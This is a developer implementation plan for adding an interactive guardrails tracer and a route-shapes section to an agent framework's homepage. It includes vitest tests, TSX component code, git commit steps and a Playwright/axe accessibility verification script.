- [ ] **Step 6: Run the tests to verify they pass**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/gates`
Expected: PASS (2 files, 15 tests).

- [ ] **Step 7: Mutation check: the arrow-key guard is tested**

In `GateTracer.tsx`, replace `next === "refund" && !viaArrow ? "decision" : null` with `next === "refund" ? "decision" : null`.
Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/gates/GateTracer.test.tsx`
Expected: 1 failed, "leaves focus in the radio group when the visitor arrows onto refund".
Restore the line, rerun, and expect 5 passed.

- [ ] **Step 8: Commit**

```bash
git status --short
git add apps/web/app/components/homepage/gates/prepare.ts apps/web/app/components/homepage/gates/GateTracer.tsx apps/web/app/components/homepage/gates/gates.module.css apps/web/app/components/homepage/gates/Guardrails.tsx apps/web/app/components/homepage/gates/GateTracer.test.tsx
git commit -m "feat(web): the four-gate call tracer, with approval focus and cancellable traces

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---

### Task 6: Both sections join the page

**Files:**
- Modify: `DeveloperHome.tsx`
- Test: `homepage.test.tsx`

- [ ] **Step 1: Update the page test first**

In `apps/web/app/components/homepage/homepage.test.tsx`, replace the first test, `it("opens with the install command, then the folder tour of the agent it creates", …)`, with:

```tsx
it("opens with the install command, then the folder tour, the guardrails and the route shapes", async () => {
  const container = document.createElement("div")
  container.innerHTML = renderToString(await DeveloperHome())
  const hero = container.querySelector('[aria-labelledby="home-title"]')
  expect(hero?.textContent).toContain("npm create b4-app@latest my-agent")
  expect(hero?.querySelector('a[href="/docs/getting-started"]')?.textContent).toBe("Get started →")
  const first = container.querySelector("#first-agent")
  expect(first?.textContent).toContain("src/app/hello/index.ts")
  expect(first?.textContent).toContain("src/app/hello/tools/greet.ts")
  expect(container.querySelector("#guardrails h2")?.textContent).toBe(
    "Four checks decide what a call can do.",
  )
  expect(container.querySelector("#route-shapes h2")?.textContent).toBe("Pick the shape per route.")
  const order = ["home-title", "first-agent", "guardrails", "route-shapes", "run-title"].map((id) =>
    [...container.querySelectorAll("[id]")].findIndex((node) => node.id === id),
  )
  expect(order.every((index) => index >= 0)).toBe(true)
  expect(order).toEqual([...order].sort((a, b) => a - b))
})
```

- [ ] **Step 2: Run it to verify it fails**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/homepage.test.tsx`
Expected: FAIL in that test only: `#guardrails h2` is `undefined`.

- [ ] **Step 3: Render both sections**

Replace `apps/web/app/components/homepage/DeveloperHome.tsx` with:

```tsx
import { CopyCommand } from "../ui/CopyCommand"
import { Eyebrow } from "../ui/Eyebrow"
import { Guardrails } from "./gates/Guardrails"
import { prepareGates } from "./gates/prepare"
import styles from "./homepage.module.css"
import { ScaffoldTerminal } from "./ScaffoldTerminal"
import { scaffoldTree } from "./scaffold-tree"
import { prepareRouteShapes } from "./shapes/prepare"
import { RouteShapes } from "./shapes/RouteShapes"
import { FolderTour } from "./tour/FolderTour"
import { prepareFolderTour } from "./tour/prepare"

const createCommand = scaffoldTree.command

export async function DeveloperHome() {
  const [tour, gates, shapes] = await Promise.all([
    prepareFolderTour(),
    prepareGates(),
    prepareRouteShapes(),
  ])
  return (
    <main id="content" tabIndex={-1} className={styles.home}>
      <div className={styles.container}>
        <section className={styles.hero} aria-labelledby="home-title">
          <div className={styles.heroCopy}>
            <Eyebrow className={styles.eyebrow}>An agent framework, the way I'd build it.</Eyebrow>
            <h1 id="home-title">
              Ridiculous speed.
              <br />
              Readable code.
            </h1>
            <p className={styles.lede}>
              Write the agent in TypeScript, give it tools, and set its limits.
              <br />
              You ship code you can actually read.
            </p>
            <p className={styles.runtime}>Runs on LangGraph.js. You keep the graph.</p>
            <div className={styles.heroActions}>
              <CopyCommand command={createCommand} className={styles.command ?? ""} />
              <a href="/docs/getting-started" className={styles.textLink}>
                Get started →
              </a>
            </div>
          </div>
          <div className={styles.heroVisual}>
            <span className={styles.eclipse} aria-hidden="true" />
            <ScaffoldTerminal />
          </div>
        </section>
        <FolderTour {...tour} />
        <Guardrails {...gates} />
        <RouteShapes code={shapes} />
        <section className={styles.takeaway} aria-labelledby="run-title">
          <div>
            <Eyebrow tone="panel" className={styles.eyebrow}>
              Get started
            </Eyebrow>
            <h2 id="run-title">Build your own agent.</h2>
            <p>Scaffold a new B4 app with one command:</p>
            <CopyCommand command={createCommand} variant="dark" className={styles.command ?? ""} />
            <br />
            <a href="/docs/getting-started" className={styles.reportLink}>
              Getting Started →
            </a>
          </div>
        </section>
      </div>
    </main>
  )
}
```

`renderToString` can't render async components, so `DeveloperHome` awaits all three preparations and passes plain data down, as it already does for the tour.

- [ ] **Step 4: Run the page tests to verify they pass**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/homepage.test.tsx app/seo/seo.test.ts app/site-chrome.test.tsx`
Expected: PASS. The em-dash check, the unique-region check (the new sections add no `section[aria-label]`), the SEO snippet terms and the olive pin all still hold.

- [ ] **Step 5: Commit**

```bash
git status --short
git add apps/web/app/components/homepage/DeveloperHome.tsx apps/web/app/components/homepage/homepage.test.tsx
git commit -m "feat(web): the guardrails and route-shape sections follow the folder tour

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---

### Task 7: Gates

**Files:** none new.

- [ ] **Step 1: Lint**

Run: `pnpm --dir apps/web lint`
Expected: exit 0. If Biome reports formatting, apply the scoped fix from "Rules" to `app/components/homepage/gates app/components/homepage/shapes app/components/homepage/DeveloperHome.tsx app/components/homepage/homepage.test.tsx` only.

- [ ] **Step 2: Typecheck**

Run: `pnpm --dir apps/web typecheck`
Expected: exit 0.

- [ ] **Step 3: The full web suite**

Run: `pnpm --dir apps/web test`
Expected: every file passes: 59 files and 910 tests passed, with 1 skipped, when this plan was verified. Don't pipe it through `tail`, because that hides the exit code.

- [ ] **Step 4: The docs check and the build-cache check**

Run: `node scripts/check-docs.mjs`
Expected: `Docs completeness check passed.` It scans `apps/web/app`, fixtures included, for banned phrases.

Run: `pnpm check:build-cache`
Expected: `Build cache config check passed (…)`. `apps/web` now depends on `@b4run/cli`.

- [ ] **Step 5: Commit any lint fixes**

```bash
git status --short
git add apps/web/app/components/homepage/gates apps/web/app/components/homepage/shapes apps/web/app/components/homepage/DeveloperHome.tsx apps/web/app/components/homepage/homepage.test.tsx
git commit -m "style(web): format the guardrails and route shapes

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

Skip this commit if nothing changed.

---

### Task 8: Browser, motion and accessibility verification, then lastmod

**Files:**
- Create (scratchpad only, not committed): `<scratchpad>/verify-pr2.mjs`, `<scratchpad>/summarize.cjs`
- Modify: `apps/web/app/seo/lastmod.generated.json`

- [ ] **Step 1: Start the dev server**

Run in the background: `pnpm --dir apps/web dev --port 3218`. Or use a `.claude/launch.json` entry through `preview_start`, but don't commit that file. Wait for `http://localhost:3218/` to return 200.

- [ ] **Step 2: Write the verification script**

Find the tools first:
- **axe:** `find ~/repos -maxdepth 6 -name axe.min.js -path '*axe-core*' 2>/dev/null | head -1`. When this plan was verified, that was `/Users/blove/repos/iem-planning-augmentation/node_modules/axe-core/axe.min.js`.
- **Playwright:** the repo's own `node_modules/.pnpm/playwright-core@1.62.1`.

Create `<scratchpad>/verify-pr2.mjs`. It relies on `data-*` hooks and `input[value]`, because CSS-module class names are hashed.

The script checks each of these at 375, 768, 1024 and 1440 px, with motion on and reduced:
- no horizontal scroll
- the smallest visible target in both sections
- no layout shift below either demo across every call, the refund decision, and every shape
- keyboard-only operation of both demos
- focus after a click on refund
- rapid clicks on the tracer
- axe
- screenshots

```js
import { readFileSync } from "node:fs"
import { chromium } from "/Users/blove/repos/dawn/node_modules/.pnpm/playwright-core@1.62.1/node_modules/playwright-core/index.mjs"

const [AXE, OUT, BASE = "http://localhost:3218"] = process.argv.slice(2)
const browser = await chromium.launch({
  executablePath: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
})

/** Top of the next section and the tracer's height: neither may move when the selection does. */
const layout = (page) =>
  page.evaluate(() => ({
    shapesTop: Math.round(document.querySelector("#route-shapes").getBoundingClientRect().top + scrollY),
    takeawayTop: Math.round(
      document.querySelector('[aria-labelledby="run-title"]').getBoundingClientRect().top + scrollY,
    ),
  }))

const results = []
for (const [width, height] of [
  [375, 812],
  [768, 1024],
  [1024, 768],
  [1440, 900],
]) {
  for (const reducedMotion of ["no-preference", "reduce"]) {
    const page = await browser.newPage({ viewport: { width, height }, reducedMotion })
    await page.goto(`${BASE}/`, { waitUntil: "networkidle" })
    await page.locator("#guardrails").scrollIntoViewIfNeeded()
    await page.waitForTimeout(400)
    const facts = await page.evaluate(() => {
      const targets = [
        ...document.querySelectorAll(
          "#guardrails label, #guardrails button, #guardrails a, #route-shapes label, #route-shapes a",
        ),
      ]
        .filter((node) => node.getClientRects().length > 0 && getComputedStyle(node).visibility === "visible")
        .map((node) => node.getBoundingClientRect())
        .filter((rect) => rect.width > 0)
      return {
        horizontalScroll: document.documentElement.scrollWidth > innerWidth,
        smallestTarget: Math.round(Math.min(...targets.map((rect) => Math.min(rect.width, rect.height)))),
      }
    })

    // Layout shift: every call and every shape leaves the page below where it was.
    const before = await layout(page)
    const shifts = []
    for (const id of ["refund", "bash", "delete", "delegate", "read"]) {
      await page.locator(`#guardrails input[value="${id}"]`).check()
      await page.waitForTimeout(50)
      const now = await layout(page)
      shifts.push(now.shapesTop - before.shapesTop)
    }
    await page.locator('#guardrails input[value="refund"]').check()
    await page.locator('#guardrails [data-board="refund"] [data-decision="once"]').click()
    shifts.push((await layout(page)).shapesTop - before.shapesTop)
    await page.locator('#guardrails [data-board="refund-once"] [data-action="again"]').click()
    await page.locator('#guardrails input[value="read"]').check()
    for (const id of ["workflow", "graph", "chain", "agent"]) {
      await page.locator(`#route-shapes input[value="${id}"]`).check()
      await page.waitForTimeout(50)
      shifts.push((await layout(page)).takeawayTop - before.takeawayTop)
    }
    facts.maxShift = Math.max(...shifts.map(Math.abs))
    await page.waitForTimeout(1200)

    // Keyboard only, tracer: arrow onto refund keeps focus in the group; Tab
    // reaches Allow once; Enter answers; focus lands on Ask again.
    await page.locator('#guardrails input[value="read"]').focus()
    await page.keyboard.press("ArrowRight")
    await page.waitForTimeout(100)
    const afterArrow = await page.evaluate(() => ({
      focused: document.activeElement?.getAttribute("value"),
      board: document.querySelector('#guardrails [data-board][data-active="true"]')?.getAttribute("data-board"),
      live: document.querySelector('#guardrails [aria-live="polite"]')?.textContent,
    }))
    await page.keyboard.press("Tab")
    const tabbed = await page.evaluate(() => document.activeElement?.textContent)
    await page.keyboard.press("Enter")
    await page.waitForTimeout(100)
    const answered = await page.evaluate(() => ({
      focused: document.activeElement?.textContent,
      board: document.querySelector('#guardrails [data-board][data-active="true"]')?.getAttribute("data-board"),
      live: document.querySelector('#guardrails [aria-live="polite"]')?.textContent,
    }))
    facts.tracerKeyboard = { afterArrow, tabbed, answered }

    // Pointer on refund: focus moves to Allow once.
    await page.locator('#guardrails input[value="read"]').check()
    await page.locator("#guardrails label", { hasText: "refund({ amount: 500 })" }).click()
    await page.waitForTimeout(100)
    facts.clickRefundFocus = await page.evaluate(() => document.activeElement?.textContent)

    // Rapid clicks: final state at once, one announcement per pick, no leftovers.
    await page.locator('#guardrails input[value="read"]').check()
    await page.waitForTimeout(1200)
    await page.evaluate(() => {
      const live = document.querySelector('#guardrails [aria-live="polite"]')
      window.__announcements = []
      new MutationObserver(() => window.__announcements.push(live.textContent)).observe(live, {
        childList: true,
        characterData: true,
        subtree: true,
      })
    })
    for (const id of ["bash", "delegate", "delete"]) {
      await page.locator(`#guardrails label:has(input[value="${id}"])`).click({ delay: 0 })
    }
    const immediate = await page.evaluate(() =>
      document.querySelector('#guardrails [data-board][data-active="true"]')?.getAttribute("data-board"),
    )
    await page.waitForTimeout(1500)
    facts.rapid = await page.evaluate((immediateBoard) => ({
      immediateBoard,
      board: document.querySelector('#guardrails [data-board][data-active="true"]')?.getAttribute("data-board"),
      announcements: window.__announcements,
      leftovers: [...document.querySelectorAll("#guardrails [data-gate], #guardrails [data-result]")].filter(
        (node) => node.style.opacity !== "" || node.style.transform !== "",
      ).length,
    }), immediate)

    // Keyboard only, shapes.
    await page.locator("#route-shapes").scrollIntoViewIfNeeded()
    await page.locator('#route-shapes input[value="agent"]').check()
    await page.locator('#route-shapes input[value="agent"]').focus()
    await page.keyboard.press("ArrowRight")
    await page.keyboard.press("ArrowRight")
    await page.waitForTimeout(400)
    facts.shapesKeyboard = await page.evaluate(() => ({
      focused: document.activeElement?.getAttribute("value"),
      visible: document.querySelector('#route-shapes pre[data-active="true"]')?.getAttribute("data-shape"),
      live: document.querySelector('#route-shapes [aria-live="polite"]')?.textContent,
    }))

    await page.locator('#guardrails input[value="bash"]').check()
    await page.waitForTimeout(1200)
    await page.locator("#guardrails").screenshot({ path: `${OUT}/guardrails-${width}-${reducedMotion}.png` })
    await page.locator("#route-shapes").screenshot({ path: `${OUT}/shapes-${width}-${reducedMotion}.png` })
    await page.addScriptTag({ content: readFileSync(AXE, "utf8") })
    facts.axe = await page.evaluate(async () => {
      const report = await window.axe.run(document, { resultTypes: ["violations"] })
      return report.violations.map((violation) => `${violation.id} (${violation.nodes.length})`)
    })
    results.push({ width, height, reducedMotion, ...facts })
    await page.close()
  }
}
await browser.close()
console.log(JSON.stringify(results, null, 2))
```

And `<scratchpad>/summarize.cjs`:

```js
for (const x of require(process.argv[2]))
  console.log(
    x.width,
    x.reducedMotion,
    "hs",
    x.horizontalScroll,
    "target",
    x.smallestTarget,
    "shift",
    x.maxShift,
    "\n  tracer",
    JSON.stringify(x.tracerKeyboard),
    "\n  click",
    x.clickRefundFocus,
    "\n  rapid",
    JSON.stringify(x.rapid),
    "\n  shapes",
    JSON.stringify(x.shapesKeyboard),
    "\n  axe",
    JSON.stringify(x.axe),
  )
```

- [ ] **Step 3: Run it and check every fact**

Run: `node <scratchpad>/verify-pr2.mjs "<axe path>" "<scratchpad>/shots" > <scratchpad>/verify.json` (create `<scratchpad>/shots` first).
Then: `node <scratchpad>/summarize.cjs <scratchpad>/verify.json`

Expected on **all 8 rows** (this is what the verification run printed):

| Fact | Expected |
|---|---|
| `hs` (horizontal scroll) | `false` |
| `target` (smallest) | `44` |
| `shift` | `0`, so switching calls, answering refund, or switching shapes never moves the next section |
| `tracer.afterArrow` | `focused: "refund"`, `board: "refund"`, `live` = `refund({ amount: 500 }): Tool scope passed, Permission waiting for approval. The run pauses for approval. Allow it once, or deny it.` |
| `tracer.tabbed` | `"Allow once"` |
| `tracer.answered` | `focused: "Ask again"`, `board: "refund-once"`, `live` = `refund({ amount: 500 }): Tool scope passed, Permission passed. refund runs. The next refund asks again.` |
| `click` | `Allow once` |
| `rapid` | `immediateBoard: "delete"` and `board: "delete"`; `announcements` is exactly three entries (bash, delegate, delete), one per click and none from a timeline; `leftovers: 0` |
| `shapes` | `focused: "graph"`, `visible: "graph"`, `live` = `Showing src/app/hello/index.ts as a graph. Raw LangGraph, with your own state, nodes and edges.` |
| `axe` | `[]` |

- [ ] **Step 4: Look at the screenshots**

Open each `guardrails-*.png` and `shapes-*.png` with the Read tool, and check:

- **Tracer at 1024 and 1440:** the four gates sit in one row.
  - `passed` and `contained` show green pills, with the `✓` and `▣` glyphs.
  - "not involved" gates are dashed.
  - The config panel marks `allow: { bash: ["curl"] },` and `network: { mode: "deny" },` with `›` and the tint.
- **Tracer at 768:** 2 × 2 gates. **At 375:** one column, and the calls wrap one per row.
- **Wrapped code lines at 375** stay right of the gutter.
- **Shapes:** a single segmented row; the code panel and the strip read `export const graph = new StateGraph(…).compile()`, then the sentence and **Graphs →**.
- **Ignore the Next dev indicator** (the round "N" at the bottom left in dev).

Fix anything that fails, rerun Task 7, and commit the fixes with a message naming the defect.

- [ ] **Step 5: Stop the dev server and clean up what it wrote**

Stop the server. Run `git status --short`. Delete `apps/web/AGENTS.md` and `apps/web/CLAUDE.md` if they appear. If `apps/web/next-env.d.ts` is modified, run `git checkout apps/web/next-env.d.ts`.

- [ ] **Step 6: Regenerate lastmod, keeping only the `/` entry**

All content is committed, so the generator dates `/` by the newest commit touching the homepage sources. The base branch also has 20 stale docs entries that this PR must not carry (Risk 6), so splice in only `/`:

```bash
git show HEAD:apps/web/app/seo/lastmod.generated.json > <scratchpad>/lastmod-head.json
pnpm --dir apps/web seo:lastmod
node -e '
const fs = require("node:fs")
const file = "apps/web/app/seo/lastmod.generated.json"
const fresh = JSON.parse(fs.readFileSync(file, "utf8"))
const head = JSON.parse(fs.readFileSync(process.argv[1], "utf8"))
head.routes["/"] = fresh.routes["/"]
fs.writeFileSync(file, JSON.stringify(head, null, 2) + "\n")
' <scratchpad>/lastmod-head.json
git diff --stat apps/web/app/seo/lastmod.generated.json
```

Expected: `1 file changed, 3 insertions(+), 3 deletions(-)`: the `/` entry's `lastModified`, `sourceDigest` and `recordDigest`. Nothing else.

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/seo`
Expected: PASS, including "covers every route the site renders".

```bash
git add apps/web/app/seo/lastmod.generated.json
git commit -m "chore(web): regenerate lastmod for the guardrails and route shapes

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

- [ ] **Step 7: Final full check**

Run: `pnpm --dir apps/web test && pnpm --dir apps/web typecheck && pnpm --dir apps/web lint && node scripts/check-docs.mjs`
Expected: exit 0 for all four. Don't add `seo:lastmod:check`: it's red on the base branch for the 20 stale docs entries (Risk 6).

---

## Spec coverage checklist (PR 2)

| Spec requirement | Where |
|---|---|
| Section `#guardrails`, four gates in a row with text states and ok/warn/danger tints | Task 5 (`GateTracer`, `gates.module.css`); Task 4 contrast test; heading changed, see Deviations |
| Call buttons (fixed to native radios in a fieldset) | Tasks 3 and 5; Deviations |
| Refund: pauses at permission; **Allow once** (`once`) and **Deny** (`deny`); the model is told on deny | Task 4 (`gateToolOp`, `Decision` typed from `PermissionDecision`); Task 5 focus tests |
| curl: passes scope and permission, contained by the sandbox; "because this config sets `mode: "deny"`"; the default is allow plus a metadata denylist | Task 4 (`store.match`, recording `dockerSandbox`); the scenario's `explain` copy |
| deleteUser: stops at scope; "the model never sees it" | Task 4 (`resolveToolScope`) |
| Delegation copy linked to `/docs/subagents#delegation-policy` | Task 4 (the delegate scenario, `resolveGuardedSubagent`) |
| The config panel shows why | Task 5 (marked lines, `explain`); Task 4 (`why` text on real lines) |
| Tracer motion: 180ms per gate, a new pick kills the timeline, reduced motion shows the final state | Task 5 tests; Task 8 `rapid` |
| Section `#route-shapes`: `agent · workflow · graph · chain` segmented radio group | Task 3 |
| Four real, typechecked fixtures with the four exports | Task 2 (typecheck mutation, `discoverRoutes`, runs) |
| `@langchain/*` types reachable from `apps/web`, pinned | Task 1 (versions from `@b4run/cli` and `@b4run/langchain`; spec assumption corrected) |
| Strip text | Task 2 (`routeShapes[].strip`, one sentence each) |
| 200ms fade; the panel sized to the tallest variant | Task 3 (stacked grid); Task 8 `shift: 0` |
| Links to `/docs/routes` and `/docs/migrating-from-langgraph`, with anchors | Task 2 anchor test |
| Honesty: every snippet is a typechecked fixture; every link anchor exists | Tasks 2 and 4 (pins, typecheck, `DOCS_INDEX`) |
| Accessibility: native controls, global focus ring, live region, colour not the only signal, 44px targets | Tasks 3 and 5; Task 8 (`target`, axe) |
| Content visible without JS; gsap only in islands via `motion/gsap.ts` | SSR tests (no inline `style`); both islands import from `../motion/gsap` |
| Design system guard, server shells with leaf islands | Task 3 Step 6; the full suite in Task 7 |
| Playwright + axe at 375/768/1024/1440, motion on and reduced | Task 8 |
| lastmod: commit only `/` | Task 8 Step 6 |
